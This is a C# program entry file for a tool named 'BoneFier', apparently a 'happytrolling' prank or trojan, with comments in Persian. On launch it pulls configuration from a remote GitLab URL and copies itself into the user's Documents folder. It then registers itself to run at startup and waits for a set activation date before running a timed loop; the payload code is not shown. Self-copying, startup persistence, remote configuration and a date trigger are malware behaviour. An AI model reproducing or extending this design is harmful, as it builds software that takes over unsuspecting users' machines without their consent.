using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using ReflectionClassOverriding;
using BoneFier;
using BoneFier.Basic;

namespace BoneFier
{
    internal class Program
    {
        //cloud data = https://gitlab.com/AliiMohammadi/happytrolling/-/raw/main/RemoteDataHappyTrolling.txt

        public static Application application;
        public static Emigrator emigrator;

        public static bool Debug = false;

        static void Main(string[] args)
        {
            Start();
        }
        static void Start()
        {
            application = new Application();

            application.UpdateAppConfig();

            //ادرس پیش فرض مهاجرت :
            // Documents/ApplicationName.exe
            emigrator = new Emigrator();
            emigrator.Emigrate();

            kernel.ChekStartUp(emigrator.ApplicationName, emigrator.TargetPath);//استارت اپ

            if (!Debug)
            {
                //برسی تاریخ فعال سازی
                if (Calendarmanager.CheckActivationDay(application.ApplicationConfig.Activationdate.ToDateTime()))
                {
                    RunTimeLoop.StartLoop(application.ApplicationConfig.LoopFrec); //فعال سازی
                }
                else
                {
                    Application.Exit();//خروج اگر اون روز نیست
                }
            }
            else
            {
                RunTimeLoop.StartLoop(application.ApplicationConfig.LoopFrec);
            }
        }
    }
}
